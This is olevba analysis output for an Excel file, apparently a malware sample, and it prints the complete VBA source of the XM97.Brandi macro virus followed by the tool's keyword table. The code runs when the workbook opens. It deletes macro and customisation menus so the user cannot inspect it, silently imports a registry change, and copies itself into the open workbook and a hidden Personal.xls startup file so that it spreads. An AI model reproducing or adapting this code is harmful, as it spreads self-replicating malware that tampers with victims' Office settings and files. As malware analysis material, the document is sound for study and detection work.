olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSExcel.Brandy.a
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSExcel.Brandy.a - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Modul1.bas 
in file: ./Virus.MSExcel.Brandy.a - OLE stream: 'Macros/VBA/Modul1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub Auto_Open()
'XM97.Brandi.a
'Knowdeth / [Metaphase VX Team & NoMercyVirusTeam]
'Specail Thanks to jackie and foxz.
Application.OnSheetActivate = "Brandi-"
End Sub

Sub Brandi-()
On Error Resume Next
CommandBars("tools").Controls("Templates and add-ins...").Delete
CommandBars("tools").Controls("Customize...").Delete
CommandBars("tools").Controls("Macro").Delete
CommandBars("view").Controls("Toolbars").Delete
CommandBars("view").Controls("Status Bar").Delete
CommandBars("window").Controls("Unhide...").Delete
MenuBars(xlWorksheet).Reset
MenuBars(xlModule).Reset
MenuBars(xlNoDocuments).Reset
MenuBars(xlInfo).Reset
MenuBars(xlChart).Reset
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlWorksheet).Menus("Tools").MenuItems("&Record Macro").Delete
MenuBars(xlWorksheet).Menus("Insert").MenuItems("&Macro").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("&Macro...").Delete
MenuBars(xlChart).Menus("Tools").MenuItems("&Record Macro").Delete
MenuBars(xlChart).Menus("Insert").MenuItems("&Macro").Delete
MenuBars(xlModule).Menus("Tools").MenuItems("Assig&n Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Record New Macro...").Delete
MenuBars(xlNoDocuments).Menus("File").MenuItems("&Unhide...").Delete
Application.ScreenUpdating = False
Application.DisplayAlerts = False
Application.EnableCancelKey = xlDisabled
Application.DisplayStatusBar = False
If UCase(Dir("c:\windows\microsoft.bak") <> "MICROSOFT.BAK" Then
 Open "c:\windows\microsoft.bak" For Output As 1
 Print #1, "REGEDIT4"
 Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Excel\Microsoft Excel]"
 Print #1, """Options6""=dword:00000000"
 Close 1
 Shell "regedit /s c:\windows\mircosoft.bak", vbHide
End If
Const MySource = "c:\windows\screensaver.sys"
Const MyBrandi = "Brandi"
Application.VBE.ActiveVBProject.VBComponents(MyBrandi).Export MySource
If Dir(Application.StartupPath & "\Personal.xls") = "Personal.xls" Then _
 GlobalInstalled = True
For x = 1 To ActiveWorkbook.VBProject.VBComponents.Count
    If ActiveWorkbook.VBProject.VBComponents(x).Name = MyBrandi Then _
     ActiveInstalled = True
Next
If ActiveInstalled = False Then
    ActiveWorkbook.VBProject.VBComponents.Import MySource
    ActiveWorkbook.SaveAs ActiveWorkbook.FullName
End If
If GlobalInstalled = False Then
    Workbooks.Add.SaveAs FileName:=Application.StartupPath _
     & "\Personal.xls"
    ActiveWorkbook.VBProject.VBComponents.Import MySource
    ActiveWindow.Visible = False
    Workbooks("Personal.xls").Save
End If
If Int(Rnd * 5) = 15 Then
Application.Caption = "Failure is not an option. It comes bundled with your Microsoft product"
Assistant.Visible = True
  With Assistant.NewBalloon
    .Icon = msoIconAlert
    .Text = "In the End.. we will remember not the words of our enemies.. but the silence of our friends"
    .Heading = "XM97.Brandi"
    .Animation = msoAnimationGetTechy
    .Show
  End With
Msgbox "Failure is not an option. It comes bundled with your Microsoft product", 0, "XM97.Brandi"
End If
If Int(Rnd * 5) = 25 Then
Shell "start http://www.avp.au/", vbHide
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Auto_Open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://www.avp.au/  |URL                                          |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

